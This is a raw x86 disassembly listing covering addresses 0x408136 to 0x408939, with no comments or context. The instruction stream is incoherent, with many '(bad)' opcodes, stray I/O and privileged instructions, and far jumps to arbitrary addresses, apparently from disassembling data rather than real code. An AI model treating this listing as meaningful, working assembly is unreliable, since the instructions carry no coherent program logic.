  408136:	in     eax,0xa1
  408138:	(bad)  
  408139:	inc    esp
  40813a:	sbb    bh,al
  40813c:	fidivr DWORD PTR [ecx-0x6d]
  40813f:	popf   
  408140:	mov    bl,0x1d
  408142:	mov    al,ds:0xc507baa1
  408147:	jmp    0x96b9:0xa1925605
  40814e:	mov    bl,0x18
  408150:	test   BYTE PTR [eax],bl
  408152:	jnp    0x4081ce
  408154:	sar    BYTE PTR ds:0xf2df788a,cl
  40815a:	mov    eax,ds:0x83071df0
  40815f:	test   DWORD PTR [edx+eax*8-0x11b92e5c],0x8255bbcc
  40816a:	sub    eax,0x9d8950ed
  40816f:	iret   
  408170:	mov    ds,WORD PTR [edi]
  408172:	xchg   ebp,eax
  408173:	nop    ebx
  408176:	scas   al,BYTE PTR es:[edi]
  408177:	ins    BYTE PTR es:[edi],dx
  408178:	inc    edi
  408179:	add    BYTE PTR [ebx],ch
  40817b:	jae    0x4081b0
  40817d:	sub    ch,BYTE PTR es:[edi]
  408180:	sahf   
  408181:	or     esp,ebx
  408183:	mov    edx,0x32b34632
  408188:	mov    fs,ebp
  40818a:	shr    BYTE PTR [ecx+0x62],cl
  40818d:	mov    ebp,0xf8e846d9
  408192:	ins    DWORD PTR es:[edi],dx
  408193:	or     DWORD PTR [ecx+0x4f64f3b6],ebx
  408199:	outs   dx,BYTE PTR ds:[esi]
  40819a:	arpl   ax,di
  40819c:	mov    bl,dh
  40819e:	outs   dx,DWORD PTR ds:[esi]
  40819f:	cmc    
  4081a0:	cld    
  4081a1:	int    0x20
  4081a3:	(bad)  
  4081a6:	and    eax,ebp
  4081a8:	out    dx,al
  4081a9:	ret    
  4081aa:	xchg   ebx,eax
  4081ab:	call   0x3a8ac
  4081b0:	lds    ecx,FWORD PTR [edi]
  4081b2:	xchg   ebx,eax
  4081b3:	xor    cl,dl
  4081b5:	mov    al,ds:0x64b7ec9
  4081ba:	arpl   WORD PTR [edx-0x22],dx
  4081bd:	dec    ebx
  4081be:	mov    dl,bh
  4081c0:	mov    ch,0x8b
  4081c2:	cmp    al,0xde
  4081c4:	(bad)  
  4081c5:	and    al,0xc8
  4081c7:	or     BYTE PTR [esi+ebx*4+0x1e173b62],cl
  4081ce:	outs   dx,BYTE PTR ds:[esi]
  4081cf:	lahf   
  4081d0:	and    ah,BYTE PTR [ebx+0x47]
  4081d3:	in     al,dx
  4081d4:	dec    DWORD PTR [edx]
  4081d6:	mov    ch,BYTE PTR [edx-0x1d]
  4081d9:	inc    edx
  4081da:	fdivp  st(1),st
  4081dc:	inc    edx
  4081dd:	add    DWORD PTR [ecx],0x2
  4081e0:	jne    0x4081bd
  4081e2:	mov    ah,0x6c
  4081e4:	stc    
  4081e5:	pop    es
  4081e6:	pop    ss
  4081e7:	xchg   BYTE PTR [edi-0x662639c0],cl
  4081ed:	sbb    BYTE PTR [ebx+0x61],cl
  4081f0:	jmp    0x408271
  4081f2:	xlat   BYTE PTR ds:[ebx]
  4081f3:	dec    ebx
  4081f4:	mov    bl,0x95
  4081f6:	icebp  
  4081f7:	push   0x9808ebaf
  4081fc:	jecxz  0x408213
  4081fe:	jnp    0x4081fa
  408200:	sbb    BYTE PTR [ebp+0x40],dh
  408203:	sub    DWORD PTR [eax+0x68],0x43
  408207:	jo     0x4081aa
  408209:	ins    DWORD PTR es:[edi],dx
  40820a:	bnd jl 0x4081b5
  40820d:	cmp    ch,0x13
  408210:	jp     0x408260
  408212:	es dec edx
  408214:	sahf   
  408215:	gs test edi,edx
  408218:	mov    al,ds:0xe8c49c73
  40821d:	or     DWORD PTR [ecx+eiz*8-0x31],eax
  408221:	add    eax,0x1311fbc5
  408226:	dec    edi
  408227:	out    dx,eax
  408228:	sbb    eax,0x15c5c2b9
  40822d:	ret    
  40822e:	cmp    DWORD PTR [ecx+0x2a],ecx
  408231:	mov    BYTE PTR ds:0xede9143f,bh
  408237:	xor    BYTE PTR [ecx+0x47fa61cd],0xd3
  40823e:	mov    ebx,edi
  408240:	jg     0x408283
  408242:	(bad)
  408245:	pop    edx
  408246:	mov    fs,WORD PTR [eax]
  408248:	push   esp
  408249:	mov    edx,0xae2e6ea0
  40824e:	cdq    
  40824f:	pop    edx
  408250:	and    al,al
  408252:	fimul  WORD PTR [ecx-0x2]
  408255:	lods   eax,DWORD PTR ds:[esi]
  408256:	pushf  
  408257:	cmp    ah,BYTE PTR [ebx]
  408259:	adc    BYTE PTR [eax],ch
  40825b:	pop    esi
  40825c:	stos   BYTE PTR es:[edi],al
  40825d:	dec    ebx
  40825e:	and    DWORD PTR [ebp+0x5a],0xb52d28c4
  408265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408266:	icebp  
  408267:	sbb    DWORD PTR [eax],ecx
  408269:	sbb    esp,DWORD PTR [edx]
  40826b:	gs enter 0x920a,0xff
  408270:	pusha  
  408271:	push   eax
  408272:	cs mov edi,0xbd80414c
  408278:	mov    ebx,0xf29f4da6
  40827d:	and    DWORD PTR [eax],esp
  40827f:	sub    BYTE PTR [edi],dh
  408281:	jg     0x4082d9
  408283:	inc    ebx
  408284:	add    BYTE PTR [esi],dl
  408286:	push   cs
  408287:	lock div esp
  40828a:	popf   
  40828b:	daa    
  40828c:	(bad)  
  40828e:	and    eax,0x575547e4
  408293:	addr16 mov eax,0xbe353058
  408299:	test   ecx,ecx
  40829b:	mov    ah,0x9f
  40829d:	push   0x2
  40829f:	xor    DWORD PTR [edi+0x3f],edi
  4082a2:	out    0xb1,al
  4082a4:	mov    ebx,0xb9af01eb
  4082a9:	push   esi
  4082aa:	test   ecx,ebx
  4082ac:	inc    esp
  4082ad:	jno    0x408283
  4082af:	js     0x408318
  4082b1:	adc    esp,edi
  4082b3:	(bad)  
  4082b4:	pop    edx
  4082b5:	inc    esp
  4082b6:	mov    eax,DWORD PTR [edi+0x1da4870f]
  4082bc:	stos   DWORD PTR es:[edi],eax
  4082bd:	mov    ecx,0x6283d5b0
  4082c2:	mov    ch,0xb4
  4082c4:	ins    BYTE PTR es:[edi],dx
  4082c5:	mov    edi,0x1642921b
  4082ca:	xor    ebp,DWORD PTR [esi]
  4082cc:	iretw  
  4082ce:	mov    bh,cl
  4082d0:	repz cmp al,0xa3
  4082d3:	retf   
  4082d4:	xchg   esi,eax
  4082d5:	gs xchg ebx,eax
  4082d7:	mov    al,0x6f
  4082d9:	and    BYTE PTR [edx],bl
  4082db:	adc    al,0x88
  4082dd:	cmp    DWORD PTR [edx+0x35],eax
  4082e0:	mov    ebp,0xc917a8cc
  4082e5:	or     edx,DWORD PTR [eax-0x323b1865]
  4082eb:	xor    DWORD PTR [edi-0x68],0x5f
  4082ef:	dec    ecx
  4082f0:	xor    BYTE PTR [ecx+eiz*8+0x998a674],bl
  4082f7:	cs dec esi
  4082f9:	stc    
  4082fa:	rcr    edi,1
  4082fc:	add    al,0x20
  4082fe:	clc    
  4082ff:	js     0x40836d
  408301:	gs or  eax,0xa2e394a0
  408307:	mov    bl,0x25
  408309:	push   ds
  40830a:	loop   0x40829b
  40830c:	add    BYTE PTR [ecx-0x2f],bl
  40830f:	mov    bl,0x88
  408311:	ds jbe 0x4082d2
  408314:	sar    BYTE PTR [ecx-0x4eea4c23],cl
  40831a:	pop    ds
  40831b:	mov    ds:0x1e04ec39,eax
  408320:	mov    ?,WORD PTR [edi+0x27]
  408323:	mov    bh,0xbe
  408325:	xor    ebp,DWORD PTR [ebp-0x15]
  408328:	mov    ah,0x42
  40832a:	inc    ebx
  40832b:	inc    ecx
  40832c:	sbb    eax,0xf337f436
  408331:	repnz cmp eax,0x67e0cd76
  408337:	push   esi
  408338:	int3   
  408339:	dec    ebp
  40833a:	mov    WORD PTR [ebp+0x54],fs
  40833d:	xor    ecx,DWORD PTR [ebx-0x6bcbfc2a]
  408343:	or     edi,DWORD PTR [esi]
  408345:	mov    ah,0x40
  408347:	xchg   edi,eax
  408348:	(bad)  
  408349:	loope  0x408348
  40834b:	mov    edx,0x6a23d46d
  408350:	inc    ecx
  408351:	mul    DWORD PTR [ecx+edx*1+0x59d34514]
  408358:	jmp    0xbd89d652
  40835d:	(bad)  
  40835e:	ja     0x40832b
  408360:	dec    esi
  408361:	fdiv   st(2),st
  408363:	fwait
  408364:	ret    0xb450
  408367:	into   
  408368:	push   esp
  408369:	mov    eax,ds:0x94270b3e
  40836e:	scas   al,BYTE PTR es:[edi]
  40836f:	mov    ebx,0xdf7c2fbf
  408374:	pop    ss
  408375:	sub    BYTE PTR [ebp+0x2a5aa546],ah
  40837b:	pop    eax
  40837c:	or     BYTE PTR [esp+ebp*1],bh
  40837f:	jle    0x40834b
  408381:	jns    0x4083ff
  408383:	mov    eax,ds:0xd2a371ec
  408388:	in     eax,dx
  408389:	test   BYTE PTR [edi-0x6e],cl
  40838c:	ja     0x4083c0
  40838e:	or     al,0xfa
  408390:	les    edi,FWORD PTR [ecx+eiz*2+0x638f17c]
  408397:	ficomp DWORD PTR [ebx+0x20ed7690]
  40839d:	ja     0x408365
  40839f:	mov    esp,edx
  4083a1:	fwait
  4083a2:	enter  0x1afb,0x9
  4083a6:	inc    ecx
  4083a7:	or     al,0xb
  4083a9:	lock imul DWORD PTR [ecx+0x6]
  4083ad:	out    0x6,eax
  4083af:	sub    eax,DWORD PTR [eax+ecx*2-0x6850dd82]
  4083b6:	fdivr  QWORD PTR [edi]
  4083b8:	dec    ebx
  4083b9:	adc    bh,0xdb
  4083bc:	je     0x4083b5
  4083be:	in     al,0xf1
  4083c0:	std    
  4083c1:	dec    ecx
  4083c2:	out    0x56,eax
  4083c4:	jmp    0x8cfc6434
  4083c9:	out    dx,eax
  4083ca:	es xchg esi,eax
  4083cc:	repnz scas eax,DWORD PTR es:[edi]
  4083ce:	or     eax,0xbbd5c088
  4083d3:	cwde   
  4083d4:	retf   
  4083d5:	(bad)  
  4083d6:	fist   WORD PTR [edx+0x7a]
  4083d9:	out    0x93,eax
  4083db:	mov    dh,0xe4
  4083dd:	je     0x408414
  4083df:	mov    al,ds:0x3f665ec1
  4083e4:	mov    al,ds:0xdfcc8682
  4083e9:	imul   eax,DWORD PTR [esi+0x15],0xac176d27
  4083f0:	mov    esi,0x708cad43
  4083f5:	mov    DWORD PTR [edx+0x3c],0x705051c9
  4083fc:	in     eax,0x5c
  4083fe:	dec    esp
  4083ff:	bound  ebp,QWORD PTR [ebp-0x1e]
  408402:	inc    esp
  408403:	out    0x92,al
  408405:	(bad)  
  408406:	mov    al,ds:0x621a5d85
  40840b:	jmp    0x6f161db6
  408410:	dec    ebp
  408411:	adc    BYTE PTR [ebp+0x21feebce],ch
  408417:	imul   ebx,DWORD PTR [esi],0x5b
  40841a:	sbb    esi,DWORD PTR [eax+0x30]
  40841d:	adc    eax,DWORD PTR [esp+edi*4]
  408420:	je     0x408444
  408422:	xor    BYTE PTR [ebx],ah
  408424:	cmc    
  408425:	repnz and eax,0x40cf935b
  40842b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40842c:	xchg   ebx,eax
  40842d:	mov    ds:0xbc9d1e0d,eax
  408432:	cmp    eax,0xe21d3b40
  408437:	je     0x4083e3
  408439:	cmp    al,0x6b
  40843b:	xor    DWORD PTR [ebx+edi*1-0x4e],0x4f
  408440:	out    dx,eax
  408441:	dec    esi
  408442:	rcr    esp,0xd4
  408445:	stc    
  408446:	jbe    0x4083f5
  408448:	pushf  
  408449:	stos   DWORD PTR es:[edi],eax
  40844a:	out    dx,eax
  40844b:	sbb    eax,0xfb817e8a
  408450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408451:	inc    edx
  408452:	lock xor al,0xf3
  408455:	in     al,dx
  408456:	add    al,0x6d
  408458:	mov    ch,0xb9
  40845a:	add    BYTE PTR [esi+0x7f7824d4],al
  408460:	add    eax,0xcb81faae
  408465:	sub    bl,ah
  408467:	scas   al,BYTE PTR es:[edi]
  408468:	pushf  
  408469:	sbb    esp,DWORD PTR [esi-0x59]
  40846c:	jecxz  0x408443
  40846e:	fmul   QWORD PTR [ebx-0x77]
  408471:	in     al,0x45
  408473:	and    bh,BYTE PTR [ebp-0x4762e8f]
  408479:	cmc    
  40847a:	xlat   BYTE PTR ds:[ebx]
  40847b:	mov    BYTE PTR [ecx],ah
  40847d:	test   DWORD PTR [eax-0x7c],ebx
  408480:	scas   eax,DWORD PTR es:[edi]
  408481:	xor    al,0xa8
  408483:	js     0x408462
  408485:	aad    0x97
  408487:	es cmp esp,ebp
  40848a:	dec    ebp
  40848b:	xor    DWORD PTR [edi+0x47],esp
  40848e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40848f:	cmp    ebp,ebp
  408491:	aad    0x7a
  408493:	sbb    al,BYTE PTR [edx+0x3694d722]
  408499:	xchg   ebx,eax
  40849a:	push   eax
  40849b:	dec    esp
  40849c:	add    BYTE PTR [edi-0x6bc8aee6],dl
  4084a2:	pop    ebp
  4084a3:	dec    esi
  4084a4:	jl     0x4084af
  4084a6:	cmp    bh,dl
  4084a8:	pop    esi
  4084a9:	push   esi
  4084aa:	jbe    0x4084ac
  4084ac:	fwait
  4084ad:	pusha  
  4084ae:	mov    bl,0xf5
  4084b0:	adc    DWORD PTR [ebp+0x62dfe73],edx
  4084b6:	loop   0x408463
  4084b8:	rol    BYTE PTR [eax+0x63],0x92
  4084bc:	and    edx,DWORD PTR [ebx-0x6d]
  4084bf:	dec    ebx
  4084c0:	ror    edx,1
  4084c2:	cmp    DWORD PTR [eax],esp
  4084c4:	in     eax,dx
  4084c5:	stos   DWORD PTR es:[edi],eax
  4084c6:	rcl    edx,cl
  4084c8:	inc    ebx
  4084c9:	push   0x44
  4084cb:	or     eax,ecx
  4084cd:	inc    esi
  4084ce:	enter  0x2f3,0x1d
  4084d2:	jbe    0x4084cc
  4084d4:	xchg   ebp,eax
  4084d5:	add    DWORD PTR [ebp+0x357117d0],edx
  4084db:	scas   eax,DWORD PTR es:[edi]
  4084dc:	mov    al,0xbb
  4084de:	cmc    
  4084df:	cmp    cl,BYTE PTR [edi-0x5cb07a42]
  4084e5:	test   eax,0x85fbd5dd
  4084ea:	add    eax,0x5d0bbe77
  4084ef:	iret   
  4084f0:	call   0xa5a1408b
  4084f5:	pop    ebx
  4084f6:	jl     0x4084ba
  4084f8:	shl    DWORD PTR [eax+0x4abc338d],1
  4084fe:	fs dec ebx
  408500:	lods   eax,DWORD PTR ds:[esi]
  408501:	xor    dh,dl
  408503:	test   al,0xaa
  408505:	arpl   bp,dx
  408507:	cmp    ebp,esi
  408509:	add    al,0xdb
  40850b:	loopne 0x4084a7
  40850d:	xchg   al,bh
  40850f:	and    al,0x1c
  408511:	fs push ecx
  408513:	fs and eax,0xb17eda65
  408519:	mov    ds:0x98ec0cb6,al
  40851e:	sbb    ebp,esp
  408520:	cdq    
  408521:	xor    BYTE PTR [ebp+0x34d384cf],0xf1
  408528:	icebp  
  408529:	cmp    BYTE PTR cs:[eax],cl
  40852c:	repnz dec ebx
  40852e:	pop    esi
  40852f:	mov    eax,ds:0x3413037b
  408534:	and    edi,0x23
  408537:	mov    BYTE PTR [edx+0x55],dh
  40853a:	sub    dl,dl
  40853c:	push   0xbea066ca
  408541:	gs in  eax,dx
  408543:	inc    eax
  408544:	pop    esi
  408545:	scas   al,BYTE PTR es:[edi]
  408546:	cmp    al,0x70
  408548:	mov    al,cl
  40854a:	in     eax,dx
  40854b:	jbe    0x4085cb
  40854d:	popa   
  40854e:	or     eax,0x8943b29a
  408553:	push   ds
  408554:	retf   
  408555:	out    dx,al
  408556:	ret    0xd2b1
  408559:	adc    DWORD PTR [ebx-0x40],eax
  40855c:	mov    eax,DWORD PTR [eax+edi*1]
  40855f:	mov    gs,edx
  408561:	pop    edi
  408562:	mov    edi,0x31949920
  408567:	pop    edx
  408568:	add    ch,BYTE PTR [ecx-0x57183558]
  40856e:	dec    ecx
  40856f:	inc    ebx
  408570:	pop    edx
  408571:	add    eax,0x98d7750d
  408576:	xchg   ch,bh
  408578:	dec    edi
  408579:	loope  0x408586
  40857b:	cld    
  40857c:	xor    eax,0x1de69c9
  408581:	adc    ah,dl
  408583:	cs xchg edi,eax
  408585:	mov    bl,0x84
  408587:	mov    dh,0xd7
  408589:	mov    WORD PTR [edi+ebx*4],?
  40858c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40858d:	call   0xca8f:0xb8221197
  408594:	stc    
  408595:	loopne 0x4085f8
  408597:	daa    
  408598:	and    eax,0x9fb3bd1c
  40859d:	mov    edx,0x53cc331b
  4085a2:	cmp    esi,DWORD PTR [eax]
  4085a4:	out    dx,al
  4085a5:	mov    edx,0xdf39c7ff
  4085aa:	push   esi
  4085ab:	nop
  4085ac:	ret    
  4085ad:	xor    eax,0xc7e608ac
  4085b2:	sub    ecx,DWORD PTR ss:[edx-0x1f]
  4085b6:	sbb    eax,0x1ebbb35d
  4085bb:	pop    ebp
  4085bc:	retf   0xc14e
  4085bf:	fisubr WORD PTR [esp+eax*2]
  4085c2:	arpl   WORD PTR [ebx],sp
  4085c4:	mov    eax,0x13c58a2d
  4085c9:	add    bl,al
  4085cb:	mov    bh,0xdb
  4085cd:	pop    esi
  4085ce:	scas   eax,DWORD PTR es:[edi]
  4085cf:	cmp    DWORD PTR [edx+ebx*4-0x5c5dd7fb],ebx
  4085d6:	or     eax,0x9d5f155c
  4085db:	fld    QWORD PTR [ebx+0xb70731d]
  4085e1:	mov    esi,0x902a63ca
  4085e6:	pop    ebp
  4085e7:	aam    0x58
  4085e9:	jnp    0x408597
  4085eb:	lea    ecx,[ecx+0x31ed3649]
  4085f1:	sti    
  4085f2:	shr    bh,1
  4085f4:	dec    esp
  4085f5:	ja     0x4085e8
  4085f7:	imul   ecx,DWORD PTR [esi+0x71],0x32
  4085fb:	test   eax,0x30985cac
  408600:	xor    eax,0xab5e23f1
  408605:	stos   BYTE PTR es:[edi],al
  408606:	dec    esp
  408607:	sub    eax,0x91508b41
  40860c:	popa   
  40860d:	je     0x40864b
  40860f:	adc    ecx,DWORD PTR [edi+eiz*4+0x2b2705e2]
  408616:	(bad)  
  408617:	sbb    eax,0x80c78074
  40861c:	sub    eax,0x41e6882
  408621:	ficom  WORD PTR [ebx+0x1957cfeb]
  408627:	mov    BYTE PTR ds:0x5e9f7263,bl
  40862d:	cmp    dl,bl
  40862f:	nop
  408630:	es dec eax
  408632:	scas   al,BYTE PTR es:[edi]
  408633:	xchg   esi,ebp
  408635:	pop    DWORD PTR [edi+ebx*2+0x21091085]
  40863c:	pop    ecx
  40863d:	test   al,0xfe
  40863f:	lea    esp,[edi]
  408641:	xor    bh,BYTE PTR [ebp+0x171b2b8a]
  408647:	cli    
  408648:	adc    DWORD PTR ds:0x73a713ed,edi
  40864e:	inc    esp
  40864f:	dec    edx
  408650:	push   eax
  408651:	xchg   ebp,eax
  408652:	mov    bl,0x21
  408654:	mov    dh,0xa8
  408656:	jg     0x408658
  408658:	mov    BYTE PTR [esi+ebp*4],cl
  40865b:	pop    edi
  40865c:	sub    esi,edi
  40865e:	jge    0x4086d0
  408660:	jl     0x40863c
  408662:	dec    BYTE PTR [esi]
  408664:	or     DWORD PTR [ebx+0x3e],esp
  408667:	daa    
  408668:	hlt    
  408669:	(bad)  
  40866a:	and    eax,DWORD PTR [ebp-0x1136bd36]
  408670:	jno    0x408697
  408672:	rcl    DWORD PTR [eax+0x3c],0x25
  408676:	stos   BYTE PTR es:[edi],al
  408677:	fsub   QWORD PTR [esi]
  408679:	(bad)  
  40867a:	and    ch,al
  40867c:	retf   0xe6cb
  40867f:	ins    DWORD PTR es:[edi],dx
  408680:	sub    eax,0xc3d23fcd
  408685:	retf   
  408686:	fdiv   QWORD PTR [ebp+ebx*8-0x3a]
  40868a:	pop    esi
  40868b:	xchg   ecx,eax
  40868c:	push   0x56
  40868e:	or     cl,bh
  408690:	shl    bh,1
  408692:	mov    BYTE PTR [esi+0x55],cl
  408695:	shl    DWORD PTR [edi-0x12],cl
  408698:	push   cs
  408699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40869a:	mov    al,ds:0x247ac343
  40869f:	fidiv  WORD PTR [ebx]
  4086a1:	mov    ebp,0xa01dcc00
  4086a6:	fimul  DWORD PTR [ebx-0x7e]
  4086a9:	int    0xbb
  4086ab:	imul   eax,DWORD PTR [ebp+0x61],0x2201f9a4
  4086b2:	jno    0x408653
  4086b4:	lods   al,BYTE PTR ds:[esi]
  4086b5:	inc    ecx
  4086b6:	jne    0x40870e
  4086b8:	push   ecx
  4086b9:	adc    edi,DWORD PTR [edx]
  4086bb:	jae    0x408641
  4086bd:	push   0xa30bb16f
  4086c2:	fist   DWORD PTR [ecx+0xe13015e]
  4086c8:	mov    al,cl
  4086ca:	lods   al,BYTE PTR ds:[esi]
  4086cb:	out    0x5c,al
  4086cd:	mov    cl,0xb6
  4086cf:	out    0x57,al
  4086d1:	ror    DWORD PTR [edi+0x4e],1
  4086d4:	bound  ebp,QWORD PTR [eax+0x2316d637]
  4086da:	sub    DWORD PTR [ebp-0x5f],ecx
  4086dd:	out    dx,eax
  4086de:	cmp    dl,BYTE PTR [edi]
  4086e0:	das    
  4086e1:	mov    bh,0x5f
  4086e3:	sbb    DWORD PTR [ecx-0x56147cb8],0x7c
  4086ea:	add    BYTE PTR [ecx+0x60],ah
  4086ed:	mov    dl,0xc7
  4086ef:	adc    BYTE PTR [ebx+0x5ffe3c13],al
  4086f5:	psrlq  mm3,QWORD PTR [eax+ebx*8]
  4086f9:	pusha  
  4086fa:	mov    cl,0x9a
  4086fc:	out    0xa3,eax
  4086fe:	(bad)  
  4086ff:	call   0x648c7bb7
  408704:	cmp    eax,DWORD PTR [ebx+0x26]
  408707:	lock icebp 
  408709:	retf   
  40870a:	jl     0x40874b
  40870c:	or     edx,DWORD PTR [eax-0x31]
  40870f:	(bad)  
  408710:	hlt    
  408711:	sti    
  408712:	sub    BYTE PTR [ebx-0x3a55acaa],0x84
  408719:	stc    
  40871a:	xor    DWORD PTR [ecx-0x6f],esp
  40871d:	lock inc ebx
  40871f:	aam    0x81
  408721:	xchg   edx,eax
  408722:	btr    DWORD PTR ds:0xbacf6f1d,edi
  408729:	jmp    0x2ec4:0xbff80421
  408730:	and    BYTE PTR [ebx-0x7a],dl
  408733:	icebp  
  408734:	xchg   esi,eax
  408735:	xor    DWORD PTR [ecx],0xffffff84
  408738:	xchg   esi,eax
  408739:	es in  al,0x85
  40873c:	cmp    BYTE PTR [ecx],0x12
  40873f:	or     DWORD PTR [ebx+0x3f],eax
  408742:	jg     0x408749
  408744:	add    al,0x6c
  408746:	dec    eax
  408747:	inc    DWORD PTR [ecx-0x32]
  40874a:	push   0x811e1b57
  40874f:	aad    0x98
  408751:	js     0x408713
  408753:	inc    ebp
  408754:	xchg   eax,ecx
  408756:	adc    bl,ch
  408758:	mov    ch,0xb1
  40875a:	inc    ebx
  40875b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40875c:	cmp    al,0xa7
  40875e:	inc    edi
  40875f:	test   DWORD PTR [esp+eiz*2-0x2be9d045],edi
  408766:	xchg   esi,eax
  408767:	mov    ebx,0xacea246a
  40876c:	and    eax,0xe06f01bc
  408771:	lods   eax,DWORD PTR ds:[esi]
  408772:	lea    esp,[eax]
  408774:	sub    ecx,DWORD PTR [ecx-0x48]
  408777:	add    dh,BYTE PTR [ebx]
  408779:	mov    esp,0x145c6c8a
  40877e:	daa    
  40877f:	data16 mov dl,0x33
  408782:	mov    edi,0xaa10fc48
  408787:	mov    esi,0x60e98f34
  40878c:	aad    0x8d
  40878e:	sub    ecx,DWORD PTR ds:[edi+0x3d]
  408792:	push   ds
  408793:	mov    ss,ebx
  408795:	sbb    BYTE PTR [ecx+edi*2-0x30],cl
  408799:	pop    edi
  40879a:	cmp    BYTE PTR [eax+0x23],dl
  40879d:	sbb    eax,0xbb76b2a3
  4087a2:	hlt    
  4087a3:	pushf  
  4087a4:	mov    DWORD PTR [edx],ebx
  4087a6:	call   0x32ad:0x775559c8
  4087ad:	or     al,0x3e
  4087af:	out    dx,al
  4087b0:	lds    edi,FWORD PTR [eax-0x24]
  4087b3:	push   edx
  4087b4:	push   ecx
  4087b5:	inc    bl
  4087b7:	jmp    0xba9333ad
  4087bc:	adc    edx,DWORD PTR [ebx-0x2]
  4087bf:	push   0xc6b23354
  4087c4:	dec    esp
  4087c5:	inc    ebx
  4087c6:	cmp    eax,0xe11a3782
  4087cb:	sub    bh,BYTE PTR [edx-0x1984f30d]
  4087d1:	pop    ds
  4087d2:	jbe    0x4087cb
  4087d4:	push   ss
  4087d5:	pop    ebx
  4087d6:	mov    ecx,0x13ff24a4
  4087db:	sbb    eax,0x69238674
  4087e0:	xor    bh,BYTE PTR [ecx+0x42]
  4087e3:	dec    edx
  4087e4:	fxch   st(7)
  4087e6:	mov    fs,esi
  4087e8:	mov    ds:0x20532d14,al
  4087ed:	inc    ebx
  4087ee:	shl    ch,1
  4087f0:	inc    edi
  4087f1:	data16 jle 0x4087ea
  4087f4:	ss inc edi
  4087f6:	cdq    
  4087f7:	or     dh,BYTE PTR [ebp-0x18]
  4087fa:	dec    ebx
  4087fb:	in     al,dx
  4087fc:	sub    BYTE PTR [eax-0x22add747],al
  408802:	cmp    bl,BYTE PTR [edi+0x15a6861e]
  408808:	(bad)  
  408809:	mov    cl,0x6e
  40880b:	fldenv ds:0x359a71cb
  408811:	push   es
  408812:	xlat   BYTE PTR ds:[ebx]
  408813:	call   0x6f72:0x95deaa48
  40881a:	es ss dec ecx
  40881d:	inc    ecx
  40881e:	push   0xeab8bacd
  408823:	mov    al,0x92
  408825:	(bad)  
  408826:	and    al,0x37
  408828:	int    0x70
  40882a:	ret    
  40882b:	sbb    eax,0x830a4d77
  408830:	mov    ah,0xc2
  408832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408833:	inc    ebp
  408834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408835:	aaa    
  408836:	pushf  
  408837:	ret    0xb56e
  40883a:	call   0x227b:0x13aae0d5
  408841:	jmp    0xb13150b9
  408846:	pop    eax
  408847:	push   edx
  408848:	xchg   esp,eax
  408849:	dec    esp
  40884a:	clc    
  40884b:	mov    edx,0x9f12cfc
  408850:	push   ecx
  408851:	mov    bh,BYTE PTR [edi]
  408853:	lods   al,BYTE PTR ds:[esi]
  408854:	nop
  408855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408856:	stc    
  408857:	mov    esi,0xfd44da7
  40885c:	pop    edi
  40885d:	mov    dl,0x51
  40885f:	lock adc al,0x86
  408862:	test   eax,0xbf36045
  408867:	adc    esp,DWORD PTR gs:[esi+0x31]
  40886b:	(bad)  
  40886c:	mov    ebx,0x80093a13
  408871:	mov    esi,0x7380c900
  408876:	repz scas eax,DWORD PTR es:[edi]
  408878:	cwde   
  408879:	dec    ebx
  40887a:	pop    ebp
  40887b:	neg    BYTE PTR [edx-0x5d535ffc]
  408881:	xor    al,0xe2
  408883:	mov    bh,0x3b
  408885:	leave  
  408886:	inc    edi
  408887:	jno    0x4088f9
  408889:	dec    edi
  40888a:	ret    
  40888b:	dec    BYTE PTR [ebp-0x100198c3]
  408891:	inc    eax
  408892:	or     cl,BYTE PTR [edi+edx*2+0x4b]
  408896:	lds    ebx,FWORD PTR [esi]
  408898:	das    
  408899:	leave  
  40889a:	sti    
  40889b:	cmp    al,0x4b
  40889d:	iret   
  40889e:	add    eax,DWORD PTR [ecx-0x57c979c1]
  4088a4:	and    eax,0xd29c60d9
  4088a9:	xor    eax,0x37bde631
  4088ae:	in     eax,dx
  4088af:	shr    BYTE PTR [edx+0x1e352747],0x1d
  4088b6:	sbb    BYTE PTR [edx-0x29],bl
  4088b9:	out    dx,eax
  4088ba:	adc    BYTE PTR [ebx+0x72fab429],dl
  4088c0:	or     BYTE PTR [edx+0x7d],al
  4088c3:	jg     0x408935
  4088c5:	inc    esp
  4088c6:	icebp  
  4088c7:	test   eax,0x8eff7e3d
  4088cc:	xor    esi,DWORD PTR ds:0x9437b1c2
  4088d2:	mov    esi,DWORD PTR [eax-0x5d]
  4088d5:	jne    0x4088ce
  4088d7:	shr    DWORD PTR [ecx-0x41],0xdc
  4088db:	xor    ch,BYTE PTR [eax]
  4088dd:	inc    esp
  4088de:	out    dx,al
  4088df:	(bad)  
  4088e0:	je     0x4088bd
  4088e2:	cmp    dl,ah
  4088e4:	ins    BYTE PTR es:[edi],dx
  4088e5:	les    esp,FWORD PTR [ecx+eiz*2]
  4088e8:	(bad)  
  4088e9:	cmp    ebx,edx
  4088eb:	jmp    0x408906
  4088ed:	idiv   DWORD PTR [ecx]
  4088ef:	gs js  0x4088a5
  4088f2:	jnp    0x4088b5
  4088f4:	jl     0x408922
  4088f6:	xchg   esi,eax
  4088f7:	nop
  4088f8:	fmul   QWORD PTR [eax+0xc]
  4088fb:	and    BYTE PTR [ebp+0x24a3131e],ch
  408901:	jmp    0xedc048b2
  408906:	popa   
  408907:	rol    DWORD PTR [edi-0x1d322d0d],cl
  40890d:	call   0x766de6d5
  408912:	inc    esp
  408913:	push   ds
  408914:	dec    esp
  408915:	pushf  
  408916:	outs   dx,BYTE PTR ds:[esi]
  408917:	lock aas 
  408919:	mov    dl,0x8c
  40891b:	out    dx,al
  40891c:	sti    
  40891d:	in     eax,0x50
  40891f:	dec    edx
  408920:	(bad)  
  408922:	and    ecx,edi
  408924:	pop    ebx
  408925:	test   eax,0xc062cd16
  40892a:	inc    esp
  40892b:	xor    al,BYTE PTR [edi]
  40892d:	call   0x4f27072f
  408932:	pop    esi
  408933:	pop    esi
  408934:	sub    edx,esp
  408936:	fmul   QWORD PTR [edi-0x54]
  408939:	js     0x408942
